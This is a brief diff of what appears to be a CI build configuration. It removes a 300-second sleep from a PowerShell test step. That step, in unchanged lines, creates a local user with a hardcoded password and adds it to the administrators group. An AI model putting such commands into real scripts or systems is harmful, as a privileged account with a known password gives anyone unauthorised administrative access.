@@ -13,4 +13,4 @@ test_script:
   - ps: |
       net.exe user /add wtf "Password123!" /Y
       net.exe localgroup administrators wtf /add      
-      sleep 300      
+   
